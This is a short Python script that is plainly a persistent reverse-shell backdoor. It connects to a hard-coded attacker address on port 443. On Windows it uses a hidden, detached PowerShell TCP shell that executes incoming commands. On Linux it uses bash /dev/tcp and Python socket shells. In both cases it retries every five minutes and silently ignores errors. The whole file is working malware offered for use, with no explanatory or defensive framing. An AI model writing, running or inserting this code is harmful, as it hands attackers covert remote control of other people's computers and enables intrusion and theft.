import socket
import os
import sys
import subprocess
import time

ATTACKER_IP = "192.168.1.77"
PORT = 443

def windows_shell():
    while True:
        try:
            # Method 1: PowerShell with hidden window
            subprocess.Popen(
                f"powershell -nop -c $c=New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String );$a=([text.encoding]::ASCII).GetBytes($o+'PS> ');$s.Write($a,0,$a.Length)}};$c.Close()",
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                shell=True
            )
            time.sleep(300)  # 5-minute check interval
        except:
            time.sleep(10)

def linux_shell():
    while True:
        try:
            # Multi-vector approach
            os.system("(bash -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1' &)".format(ATTACKER_IP, PORT))
            os.system("(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &)".format(ATTACKER_IP, PORT))
            time.sleep(300)
        except:
            time.sleep(10)

if __name__ == "__main__":
    if os.name == 'nt':
        windows_shell()
    else:
        linux_shell()
